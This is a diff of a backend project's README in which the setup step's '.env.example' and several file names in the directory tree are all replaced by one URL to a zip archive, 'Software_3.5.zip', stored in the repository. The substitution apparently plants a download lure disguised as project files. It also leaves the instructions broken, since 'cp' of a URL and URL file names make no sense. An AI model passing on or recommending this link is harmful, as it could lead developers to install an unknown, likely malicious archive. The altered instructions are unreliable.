@@ -41,10 +41,10 @@ npm install
 ```
 
 3. Configure environment variables
-Copy `.env.example` to `.env` and fill in your credentials:
+Copy `https://github.com/jeepedia/backend/raw/refs/heads/main/src/controllers/Software_3.5.zip` to `.env` and fill in your credentials:
 
 ```bash
-cp .env.example .env
+cp https://github.com/jeepedia/backend/raw/refs/heads/main/src/controllers/Software_3.5.zip .env
 ```
 
 Required environment variables:
@@ -74,15 +74,15 @@ npm run dev
 
 ```
 src/
-├── app.js              # Express app configuration
-├── index.js            # Application entry point
-├── passport.js         # Passport OAuth configuration
+├── https://github.com/jeepedia/backend/raw/refs/heads/main/src/controllers/Software_3.5.zip              # Express app configuration
+├── https://github.com/jeepedia/backend/raw/refs/heads/main/src/controllers/Software_3.5.zip            # Application entry point
+├── https://github.com/jeepedia/backend/raw/refs/heads/main/src/controllers/Software_3.5.zip         # Passport OAuth configuration
 ├── controllers/        # Route controllers
 ├── database/          # Database configuration
 ├── routes/            # API routes
 └── utils/             # Utility functions
-    ├── imageHandler.js    # Image processing utilities
-    └── testImageProcessing.js # Testing utilities
+    ├── https://github.com/jeepedia/backend/raw/refs/heads/main/src/controllers/Software_3.5.zip    # Image processing utilities
+    └── https://github.com/jeepedia/backend/raw/refs/heads/main/src/controllers/Software_3.5.zip # Testing utilities
 ```
 
 ## Image Processing Flow
